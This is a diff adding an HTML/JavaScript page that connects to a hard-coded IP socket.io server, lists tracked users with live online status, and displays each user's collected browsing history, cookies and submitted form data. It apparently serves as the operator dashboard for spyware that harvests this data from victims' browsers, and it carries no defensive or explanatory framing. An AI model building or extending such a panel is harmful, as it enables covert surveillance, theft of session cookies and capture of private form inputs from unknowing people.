@@ -1,0 +1,413 @@
+
+
+
+
+
+<html>
+<head>
+  <script src='socket.io.js'></script>
+  <script src='jquery.min.js'></script>
+  <script>
+
+
+
+
+
+
+  function doSomething() {
+
+
+
+    socket = io('http://54.147.238.233:32873');
+    socket.emit('user_list', {},function (data) {
+      console.log(data);
+
+      $("#selectBox1").empty();
+      var selectList = document.getElementById("selectBox1");
+      var selectList2 = document.getElementById("selectBox2");
+
+      data.forEach(function(entry)
+      {
+
+        console.log("debug 1");
+        console.log(entry);
+
+
+
+        var option = document.createElement("option");
+        var ele =entry.user_id;
+        console.log(ele);
+        option.value = ele;
+        option.text = ele;
+        selectList.appendChild(option);
+
+      });
+
+
+    });
+
+
+
+  }
+
+
+
+  function foldDiv(id){
+    $('#'+id).toggle();
+  };
+
+
+
+  function fill_div(id1,title,entry)
+  {
+
+    var divElement = document.createElement("div");
+
+    var msg= "<pre>"+JSON.stringify(entry, null, 2)+"</pre>";
+
+
+
+    var button1 = document.createElement("button");
+    button1.innerHTML=title;
+    button1.addEventListener("click", function(){
+      foldDiv(id1);  });
+
+      divElement.appendChild(button1);
+
+
+
+      var divElement2 = document.createElement("div");
+      divElement2.id = id1;
+      divElement2.innerHTML=msg;
+      divElement.appendChild(divElement2);
+
+
+      textdiv.appendChild(divElement);
+      foldDiv(id1);
+
+
+
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+function get_user_info()
+{
+
+
+
+
+
+
+
+
+
+  var divElement =  document.getElementById("user_list_div");
+  $("#user_list_div").empty();
+
+
+  console.log("refresh");
+  socket = io('http://54.147.238.233:32873');
+  socket.emit('last_online', {},function (data) {
+    // console.log(data);
+    $("#selectBox1").empty();
+    var selectList = document.getElementById("selectBox1");
+    var selectList2 = document.getElementById("selectBox2");
+
+
+    data.forEach(function(entry)
+    {
+
+
+var last_online = entry.last_online;
+var cur_time = Date.now();
+var diff = cur_time -last_online;
+
+
+
+
+  var id1 = guid();
+var divElement2 = document.createElement("div");
+divElement2.id = id1;
+divElement2.innerHTML=entry.user_id+"</br></br>";
+
+
+
+
+
+
+
+
+
+
+      var option = document.createElement("option");
+      var ele =entry.user_id;
+      // console.log(ele);
+      option.value = ele;
+      option.text = ele;
+      if(diff< 60000)
+      {
+        // option.style.backgroundColor="red";
+        divElement2.style.backgroundColor="red";
+      }
+
+      else {
+        // option.style.backgroundColor="green";
+      }
+
+      divElement.appendChild(divElement2);
+      selectList.appendChild(option);
+    });
+  });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+}
+
+
+    function guid() {
+      function s4() {
+        return Math.floor((1 + Math.random()) * 0x10000)
+        .toString(16)
+        .substring(1);
+      }
+      return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
+      s4() + '-' + s4() + s4() + s4();
+    }
+
+
+
+
+
+
+    function fetch()
+    {
+
+
+      socket = io('http://54.147.238.233:32873');
+      socket.emit('user_list', {},function (data) {
+        // console.log(data); // data will be 'woot'
+
+
+
+        var selectList = document.getElementById("selectBox1");
+        var selectList2 = document.getElementById("selectBox2");
+
+
+
+        var selectBox = document.getElementById("selectBox1");
+        var selectedValue = selectBox.options[selectBox.selectedIndex].value;
+        // var selectList = document.getElementById("selectBox1");
+
+
+        var selectBox2 = document.getElementById("selectBox2");
+        var selectedValue2 = selectBox2.options[selectBox2.selectedIndex].value;
+
+        console.log(selectedValue+"__"+selectedValue2);
+
+
+        var textdiv = document.getElementById("textdiv");
+        // textdiv
+
+        $("#textdiv").empty();
+
+        for (var i = 0; i < data.length; i++) {
+
+          if(data[i].user_id == selectedValue)
+          {
+            var value =data[i][selectedValue2];
+
+            // var id1 ="";
+            var title = "";
+
+
+            if(selectedValue2 == "history" )
+            {
+
+
+              value.forEach(function(entry)
+              {
+                var id1 = entry.id
+
+
+
+                var title;
+                if(  entry.title != "")
+                title  = entry.title;
+                else {
+                  title  =  entry.url.substring(0,100);
+                }
+
+
+
+
+
+                fill_div(id1,title,entry);
+
+
+              });
+
+            }
+            else     if(selectedValue2 == "cookies" )
+            {
+
+
+              value.forEach(function(entry)
+              {
+                var id1 = guid();
+                var title = entry.path;
+
+                fill_div(id1,title,entry);
+
+
+              });
+
+
+            }
+            else     if(selectedValue2 == "forms" )
+            {
+
+
+              value.forEach(function(entry)
+              {
+                var id1 = guid();
+                var title = entry.baseURI.substring(0,100);
+
+                fill_div(id1,title,entry);
+
+
+              });
+
+
+            }
+
+
+
+
+
+
+
+
+
+
+
+
+            // console.log(value[2]);
+
+
+
+            // document.getElementById("message").innerHTML = value;
+
+
+            //     var textdiv = document.getElementById("textdiv");
+            // var t = document.createTextNode(value);     // Create a text node
+            // textdiv.appendChild(t);
+
+          }
+
+        }
+
+
+
+
+        console.log('waitigng list');
+
+
+
+      });
+
+
+
+
+
+
+
+    }
+
+    </script>
+
+  </head>
+  <body>
+
+
+<div style="height: 500px;" > user list:
+  <br>
+  <br>
+
+<div  id="user_list_div">user list:</div>
+<br>
+<br>
+
+
+</div>
+
+    <div  id="myDiv">
+
+
+      <select id="selectBox1" >
+
+      </select>
+
+
+
+
+      <!-- <select id="selectBox2" onchange="changeFunc();">
+
+    </select> -->
+
+
+    <select id="selectBox2" >
+      <option>history</option>
+      <option>cookies</option>
+      <option>forms</option>
+    </select>
+
+
+
+    <button onclick="fetch()">fetch</button>
+
+
+    <br><br>
+    <br>
+    <br>
+    <br>
+
+
+
+  </div>
+
+
+  <div id = "textdiv"></div>
+
+  <script> get_user_info();</script>
+<script> setInterval(get_user_info, 2000);</script>
+
+
+  <!-- <script> doSomething();</script> -->
+
+
+</body>
+</html>
